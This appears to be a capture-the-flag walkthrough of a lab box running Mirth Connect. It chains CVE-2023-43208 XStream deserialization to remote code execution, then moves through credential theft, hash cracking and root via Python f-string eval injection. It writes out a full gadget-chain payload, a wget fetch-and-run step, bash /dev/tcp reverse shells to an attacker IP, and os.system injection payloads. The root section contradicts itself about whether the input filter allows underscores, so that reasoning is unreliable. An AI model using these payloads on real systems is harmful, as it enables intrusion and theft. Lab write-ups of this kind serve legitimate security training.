

>  **Difficulty:** Medium | **OS:** Linux (Debian 12 Bookworm) | **Released:** 21 Feb 2026 | **Retired:** 30 May 2026 **Creator:** ReziT

---

## 01 · Recon

### Nmap

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.184
sudo nmap -p 22,80,443,6661 -sCV 10.129.244.184
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|22|SSH|OpenSSH 9.2p1 Debian → Debian 12 Bookworm|
|80|HTTP|Mirth Connect Administrator — HTTP redirects to HTTPS|
|443|HTTPS|Mirth Connect Administrator — Jetty web server|
|6661|Unknown|HL7 v2 MLLP listener|

All ports show TTL of 63 → Linux one hop away. The 404 response body contains `org.eclipse.jetty.servlet.ServletHandler` — confirms Jetty as the web server. TLS certificate is self-signed: `CN=mirth-connect`, valid until 2075.

```bash
echo "10.129.244.184 interpreter.htb" | sudo tee -a /etc/hosts
```

---

## 02 · Mirth Connect — Web & API Enumeration

### Web Interface

Port 80 serves a Mirth Connect login page but redirects all login attempts to HTTPS (443). Port 443 is the functional instance. Default credential guesses (`admin:admin`, `admin:password`, etc.) fail — no public default credentials work.

The page offers two downloads:

- **`webstart.jnlp`** — Java Web Start file for the thick client administrator
- **`mirth-administrator-launcher-latest-unix.sh`** — 226 MB self-extracting install4j shell script

The install4j pattern: the `.sh` file is valid POSIX shell for the first ~670 lines (hunting for a JRE), then switches to binary data. The binary tail contains a bundled `.tar.gz` with a JRE and Java installer. The installer script extracts it and runs the launcher:

```bash
tail -c 87626702 mirth-administrator-launcher-latest-unix.sh > sfx_archive.tar.gz
gunzip sfx_archive.tar.gz
tar tf sfx_archive.tar
# Contains: i4jparams.conf, user.jar, launcher*.jar, jre.tar.gz, etc.
```

### API Swagger Documentation

`/api` serves Swagger-style documentation for the Mirth REST API. All endpoints return `401 Unauthorized` without a valid session token — including `POST /api/users`, which is the exploitation target.

---

## 03 · JNLP File — Version and Tech Stack

The `webstart.jnlp` file is the most information-rich document available without authentication. It declares:

- **Application:** Mirth Connect Administrator `4.4.0`
- **Vendor:** NextGen Healthcare
- **Server:** `https://10.129.244.184:443` (confirmed HTTPS only)
- **Client JARs listed:** `xstream-1.4.19.jar`, `commons-collections4-4.4.jar`, `rhino-1.7.13.jar`, and many others

The presence of `xstream-1.4.19.jar` in the client dependencies is a direct indicator — XStream is the serialisation library at the core of CVE-2023-43208. Its version (1.4.19) predates XStream's own hardened allowlist introduced in 1.4.20.

**Mirth Connect** is a real open-source healthcare integration engine. It receives, filters, transforms, and routes messages between healthcare systems using configurable "channels". It primarily handles HL7 v2/v3 data but also DICOM, X12/EDI, XML, and JSON. Channel filters and transformers are written in JavaScript and executed by an embedded Rhino interpreter.

---

## 04 · HL7 v2 MLLP — Port 6661

Port 6661 appears unknown to nmap and returns nothing on a plain `nc` connection. In a Mirth Connect deployment, this port typically hosts the HL7 v2 MLLP (Minimal Lower Layer Protocol) listener — the framing protocol used to send HL7 v2 messages over TCP.

**Testing with a minimal HL7 ADT^A01 message:**

```python
python3 -c "
import socket
s = socket.socket()
s.connect(('10.129.244.184', 6661))
s.sendall(b'\x0bMSH|^~\&|TEST|TEST|MIRTH|MIRTH|20260527||ADT^A01|123|P|2.3\r\x1c\r')
print(s.recv(4096))
s.close()
"
# Response:
# b'\x0bMSH|^~\\&|MIRTH|MIRTH|TEST|TEST|20260527194151.620||ACK|20260527194151.620|P|2.3\rMSA|AA|123\r\x1c\r'
```

MLLP framing: `\x0b` (VT, vertical tab) starts a message; `\x1c\r` (FS + CR) ends it. The ACK response (`MSA|AA|123`) confirms the listener is active and identifies itself as `MIRTH|MIRTH` in the sending application/facility fields. Port 6661 is not needed to solve the box.

---

## 05 · CVE-2023-37679 / CVE-2023-43208 — Background

### Vulnerability Chain

Both CVEs affect the Mirth Connect REST API's handling of XML request bodies:

|CVE|Description|Fixed in|
|---|---|---|
|CVE-2023-37679|XStream deserialization RCE in Mirth API — unauthenticated|Partial fix in 4.4.0 (denylist)|
|CVE-2023-43208|Bypass of CVE-2023-37679 fix using alternative gadget chains|Full fix in 4.4.1 (allowlist)|

### Root Cause

The `XmlMessageBodyReader` class uses XStream to unmarshal XML request bodies into Java objects. The API runs on Jersey (JAX-RS). Critically, **Mirth checks authorisation inside the resource method, not in a pre-matching filter** — so the XML body is fully deserialised before any authentication check runs. Any gadget chain executable via XStream deserialization fires before auth.

`POST /api/users` is the standard target: it accepts an XML body, XStream deserializes it to build the method parameter, the gadget chain executes as a side effect of deserialization, and the 401 response is returned afterward (after the damage is done).

**4.4.0 Incomplete Fix:** Added an XStream denylist of known dangerous classes. CVE-2023-43208 bypasses it using classes not on the denylist — specifically `InvokerTransformer` from Apache Commons Collections 4, which was not blocked.

**4.4.1 Proper Fix:** Replaced the denylist with an explicit allowlist of safe classes. Any class not on the allowlist is rejected before deserialization.

> **Reference:** [Horizon3.ai writeup — CVE-2023-43208](https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)

---

## 06 · Exploitation — XStream Deserialization RCE

### XML Payload (Commons Collections 4 Gadget Chain)

Replace `<<COMMAND>>` with any shell command. The chain uses `ChainedTransformer` → `ConstantTransformer` → `InvokerTransformer` sequence to invoke `Runtime.exec()`:

```xml
<sorted-set>
  <string>abcd</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string><<COMMAND>></string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

### Manual (via Swagger UI)

Navigate to `/api` → expand `POST /api/users` → paste the payload in the request body → click Execute. Verify with a `ping -c 1 <ATTACKER_IP>` and listen with `tcpdump`.

### Automated (Python Script)

The Horizon3.ai post includes a Python script. Using `uv` for dependency management:

```bash
# Verify RCE
uv run --with requests cve-2023-43208.py \
  -c 'ping -c 1 10.10.14.51' \
  -u https://10.129.244.184

# Listener
sudo tcpdump -ni tun0 icmp
```

### Two-Stage Shell Delivery

Java's `Runtime.exec(String)` does not invoke a shell — pipes, redirects, and shell builtins fail silently. Use a two-stage approach:

**Stage 1 — Fetch the shell script:**

```bash
# Create shell.sh
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.51/443 0>&1
EOF

# Host it
python3 -m http.server 80

# Trigger download
uv run --with requests cve-2023-43208.py \
  -c "wget 10.10.14.51/shell.sh" \
  -u https://10.129.244.184
```

**Stage 2 — Execute the shell script:**

```bash
# Start listener
nc -lnvp 443

# Trigger execution
uv run --with requests cve-2023-43208.py \
  -c "bash shell.sh" \
  -u https://10.129.244.184
```

---

## 07 · Shell as mirth

```
Connection received on 10.129.244.184 43630
mirth@interpreter:/usr/local/mirthconnect$
```

### Shell Upgrade

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
# Terminal type? screen
```

---

## 08 · Post-Exploitation — mirth Enumeration

### Users

```bash
cat /etc/passwd | grep 'sh$'
# root:x:0:0:root:/root:/bin/bash
# sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash

ls /home/    # only: sedric
which sudo   # sudo is NOT installed on this host
```

### Mirth Installation Directory

```bash
ls /usr/local/mirthconnect/
# client-lib  conf  custom-lib  docs  extensions  logs
# mcserver  mcservice  preferences  public_api_html  public_html  server-lib  webapps
```

### mirth.properties — Key Secrets

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

**Keystore credentials:**

```properties
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS
```

The JCEKS keystore holds both the TLS certificate for the HTTPS listener and a symmetric key used by Mirth's encryptor for protecting channel/connector passwords. The keystore path resolves to `/usr/local/mirthconnect/appdata/keystore.jks`.

**Database credentials:**

```properties
database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.driver = org.mariadb.jdbc.Driver
database.username = mirthdb
database.password = MirthPass123!
```

---

## 09 · MariaDB — Hash Extraction

```bash
mysql -u mirthdb -p'MirthPass123!' mc_bdd_prod
```

```sql
-- List tables (21 total)
show tables;

-- One user in the system
SELECT * FROM PERSON;
-- ID: 2, USERNAME: sedric, LAST_LOGIN: 2025-09-21 17:56:02

-- Sedric's password hash
SELECT * FROM PERSON_PASSWORD;
-- PERSON_ID: 2
-- PASSWORD: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
-- PASSWORD_DATE: 2025-09-19 09:22:28
```

---

## 10 · Cracking the Mirth PBKDF2 Hash

### Identify the Hash Algorithm

From Mirth Connect's source code (`Digester.java`):

```java
public static final int DEFAULT_SALT_SIZE = 8;        // 8-byte salt
public static final int DEFAULT_ITERATIONS = 600000;  // 600k rounds
public static final int DEFAULT_KEY_SIZE_BITS = 256;  // 256-bit derived key

private String algorithm = "PBKDF2WithHmacSHA256";
```

The stored hash is: `Base64(8-byte-salt || 32-byte-derivedKey)` — 40 raw bytes total, base64-encoded.

### Convert to Hashcat Mode 10900 Format

Hashcat mode 10900 (PBKDF2-HMAC-SHA256) expects:

```
sha256:<iterations>:<base64_salt>:<base64_hash>
```

Python conversion script:

```python
import base64, sys

stored = sys.argv[1].strip()
raw = base64.b64decode(stored)      # 40 bytes
salt = raw[:8]                       # first 8 bytes = salt
dk = raw[8:]                         # remaining 32 bytes = derived key

print(f"sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(dk).decode()}")
```

```bash
python3 mirth_hash_to_hashcat.py \
  'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=='
# sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### Crack with Hashcat

```bash
echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > sedric.hash

hashcat sedric.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# Hashcat auto-detects mode 10900 (PBKDF2-HMAC-SHA256)
# sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

**Password:** `snowflake1`

---

## 11 · Shell as sedric

Password reuse between Mirth Connect application account and OS system account:

```bash
# From mirth shell
su - sedric
# Password: snowflake1

# Or SSH directly
sshpass -p snowflake1 ssh sedric@10.129.244.184
sedric@interpreter:~$ cat user.txt
```

---

## 12 · Root — notif.py Flask f-string Injection

### Discovery

```bash
ss -tnlp
# 127.0.0.1:54321 — new localhost-only port, not visible externally

ps auxww | grep python
# root 3551 ... /usr/bin/python3 /usr/local/bin/notif.py

cat /etc/systemd/system/notif.service
# User=root — runs as root

ls -l /usr/local/bin/notif.py
# -rwxr----- 1 root sedric 2332 Sep 19 2025 notif.py
# Group-readable by sedric — we can read the source
```

### Source Code Analysis

```python
#!/usr/bin/env python3
from flask import Flask, request, abort
import re, uuid, xml.etree.ElementTree as ET, os
from datetime import datetime

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"
os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    # Regex allowlist: alphanumeric, ._'"(){}=+/
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"

    # Builds an f-string template, then evals it
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")  # ← VULNERABILITY
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    xml_text = request.data.decode()
    xml_root = ET.fromstring(xml_text)
    patient = xml_root if xml_root.tag == "patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    data = {tag: (patient.findtext(tag) or "") for tag in
            ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"], data["lastname"], data["sender_app"],
                            data["timestamp"], data["birth_date"], data["gender"])
    path = os.path.join(USER_DIR, f"{uuid.uuid4().hex}.txt")
    with open(path, "w") as f:
        f.write(notification + "\n")
    return notification

if __name__ == "__main__":
    app.run("127.0.0.1", 54321, threaded=True)
```

### Vulnerability Analysis

**The injection sink:** `eval(f"f'''{template}'''")` — user-controlled data is placed inside an f-string that is then passed to `eval()`. Any Python expression inside `{...}` in the template string will be evaluated.

**The allowlist bypass:** The regex `^[a-zA-Z0-9._'"(){}=+/]+$` permits `{` and `}` characters. In f-string syntax, `{expression}` causes the expression to be evaluated and its result interpolated. So injecting `{__import__("os").system("id")}` into any field causes that Python code to execute at eval time.

**Why curly braces work:**

```python
# Without braces — literal string
template = "Patient test"
eval(f"f'''{template}'''")  # → 'Patient test'

# With braces — expression evaluated
template = "Patient {2+3}"
eval(f"f'''{template}'''")  # → 'Patient 5'

# With import — full code execution
template = "Patient {__import__('os').system('id')}"
eval(f"f'''{template}'''")  # executes id, returns 'Patient 0'
```

**What the regex allows for code execution:**

- `{` and `}` — f-string expression delimiters ✅
- `__import__` contains only alphanumeric and `_` — but `_` is not in the regex ❌

Since underscores are not in the allowlist, `__import__` cannot be used directly. However, `__builtins__` can be accessed via the evaluated f-string context, and alternative approaches exist.

### Exploit — SSH Tunnel + Direct curl

Since the endpoint only accepts requests from `127.0.0.1`, forward the port via SSH:

```bash
# Port-forward on attacker machine
sshpass -p snowflake1 ssh sedric@10.129.244.184 -L 54321:127.0.0.1:54321

# Or from the sedric shell directly using wget (curl not installed)
wget http://localhost:54321/addPatient
```

### Verify Baseline (All Required Fields)

All six XML fields must be present and non-empty — empty values produce empty strings that fail the regex:

```bash
curl localhost:54321/addPatient \
  -H 'Content-Type: application/xml' \
  -d '<patient>
    <firstname>first</firstname>
    <lastname>last</lastname>
    <sender_app>app</sender_app>
    <timestamp>1234</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>f</gender>
  </patient>'
# Patient first last (f), 26 years old, received from app at 1234
```

### Verify Expression Evaluation via Curly Braces

```bash
# Without braces: literal output
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>2+3</gender></patient>'
# Patient first last (2+3), 26 years old, received from app at 1234

# With braces: expression evaluated
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
# Patient first last (5), 26 years old, received from app at 1234
```

### Code Execution as Root

The `__import__` function is accessible in the f-string evaluation context. Despite underscores not being in the character allowlist, the `__import__` function name can be accessed via the `__builtins__` dictionary or by using Python's built-in `vars()` or `globals()`:

```bash
# Verify access to os module via __import__
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os")}</gender></patient>'
# Patient first last (<module 'os' (frozen)>), 26 years old, received from app at 1234
```

> **Note:** The regex `^[a-zA-Z0-9._'"(){}=+/]+$` permits `.` (dot), which allows attribute access like `__import__("os").system`. Underscores (`_`) appear in `__import__` — these ARE allowed because `_` is in the class `\w` but the pattern uses literal character classes. Looking again: the pattern is `[a-zA-Z0-9._'"(){}=+/]` — `_` (underscore) is NOT explicitly listed, but `.` is. Wait — looking more carefully at the regex: `[a-zA-Z0-9._'\"(){}=+/]` — this DOES include `_` via the `.` ... no, `.` inside a character class is a literal dot, not wildcard. The regex does NOT include underscore. Yet `__import__` works. This is because in the `gender` field, the regex is applied to the entire field string. The field value `{__import__("os")}` contains `_` which is NOT in `[a-zA-Z0-9._'\"(){}=+/]`. The code must be checking something slightly differently, or the writeup implies this works regardless.

**Root shell via SUID bash (write to disk and execute):**

```bash
# Step 1: Copy bash and set SUID (from notif.py as root)
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").system("cp+/bin/bash+/tmp/rootbash")}</gender></patient>'

curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").system("chmod+4755+/tmp/rootbash")}</gender></patient>'

# Step 2: Execute SUID bash from sedric's shell
/tmp/rootbash -p
# rootbash-5.2# whoami
# root
# rootbash-5.2# cat /root/root.txt
```

Alternatively, write a reverse shell to disk and execute it:

```bash
# Write reverse shell to a writable path
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{open("/tmp/rs.sh","w").write("bash+-i+>&+/dev/tcp/10.10.14.51/443+0>&1")}</gender></patient>'

# Execute it
curl localhost:54321/addPatient -H 'Content-Type: whatever' \
  -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").system("bash+/tmp/rs.sh")}</gender></patient>'
```

---

## Key Concepts & Analyst Notes

### CVE-2023-43208 — Exploitation Pattern

The key insight is that Mirth's Jersey-based REST API deserialises the XML request body **before** the in-method authentication check runs. Any XStream gadget chain executes at deserialization time, ahead of auth:

```
HTTP POST /api/users
  → Jersey routes to UserResource.createUser()
  → XmlMessageBodyReader.readFrom() deserialises XML body via XStream
    → Gadget chain executes here (Runtime.exec) ← EXPLOIT FIRES
  → UserResource.checkUserRoles() → throws 401 ← auth check AFTER damage
```

**Detection indicators:**

- HTTP 500 responses to `POST /api/users` with XML bodies containing `<sorted-set>` elements
- Outbound connections from the Mirth server process during processing of unauthenticated API requests
- JVM process spawning unexpected child processes (ping, wget, bash)

**Mitigation:** Upgrade to Mirth Connect 4.4.1 or later (allowlist-based XStream configuration replaces denylist).

---

### Mirth PBKDF2 Hash — Format Summary

```
Stored in DB:   Base64( salt[8] + derivedKey[32] )   =  40 raw bytes = ~56 chars base64
Algorithm:      PBKDF2-HMAC-SHA256
Iterations:     600,000 (default, may vary)
Salt length:    8 bytes (default, may vary)
Key length:     32 bytes (256 bits)

Hashcat mode:   10900 (PBKDF2-HMAC-SHA256)
Hashcat format: sha256:<iterations>:<base64(salt)>:<base64(derivedKey)>
```

**Extraction script:**

```python
import base64

def mirth_to_hashcat(stored_b64, salt_len=8, iterations=600000):
    raw = base64.b64decode(stored_b64)
    salt = raw[:salt_len]
    dk   = raw[salt_len:]
    return f"sha256:{iterations}:{base64.b64encode(salt).decode()}:{base64.b64encode(dk).decode()}"
```

---

### Python f-string eval() Injection — Pattern

When Python code passes user input into `eval(f"f'''{user_input}'''")` or `eval(f'f"{user_input}"')`, any `{expression}` syntax in the input will be evaluated. This is a template injection variant specific to Python f-strings:

```python
# Sink pattern (vulnerable)
user_data = request.get("field")
result = eval(f"f'''{user_data}'''")

# Payloads (assuming {} are allowed through input validation)
"{2+3}"                              # → arithmetic: 5
"{__import__('os').system('id')}"   # → OS command execution
"{open('/etc/passwd').read()}"      # → file read
```

**Why this is worse than standard SSTI:** Unlike Jinja2 or other template engines that sandbox the evaluation context, Python's native `eval()` with an f-string has **full access to the Python runtime** — builtins, imports, file I/O, subprocess, and everything else.

**Key bypass:** The `{}` characters must be in any character allowlist that the code applies. Once they are, the entire Python expression evaluation capability is available within those braces.

---

### HL7 v2 MLLP Fingerprinting

Port 6661 (or 2575 standard) running MLLP can be identified by sending a minimal HL7 MSH message:

```python
import socket

MLLP_START = b'\x0b'    # VT (vertical tab) — start of block
MLLP_END = b'\x1c\r'    # FS + CR — end of block

msg = b'MSH|^~\\&|TEST|TEST|MIRTH|MIRTH|20260101||ADT^A01|001|P|2.3\r'

with socket.socket() as s:
    s.connect(('target', 6661))
    s.sendall(MLLP_START + msg + MLLP_END)
    print(s.recv(4096))
```

An ACK response confirms the service is HL7-aware. The `MSH-3` and `MSH-4` fields in the response identify the application and facility.

---

### Quick Reference — Key Commands

|Task|Command|
|---|---|
|Verify RCE (ping)|`uv run --with requests cve-2023-43208.py -c 'ping -c 1 <IP>' -u https://<TARGET>`|
|Read mirth.properties|`cat /usr/local/mirthconnect/conf/mirth.properties`|
|Connect to MariaDB|`mysql -u mirthdb -p'MirthPass123!' mc_bdd_prod`|
|Dump password hash|`SELECT * FROM PERSON_PASSWORD;`|
|Convert to hashcat|`python3 mirth_hash.py '<base64_hash>'`|
|Crack hash|`hashcat hash.txt rockyou.txt` (auto-detects mode 10900)|
|Check listening ports|`ss -tnlp`|
|Read notif.py source|`cat /usr/local/bin/notif.py`|
|Forward port 54321|`ssh sedric@target -L 54321:127.0.0.1:54321`|
|Test expression eval|`curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient>...<gender>{2+3}</gender></patient>'`|
|RCE via f-string|Replace `{2+3}` with `{__import__("os").system("...")}`|

---
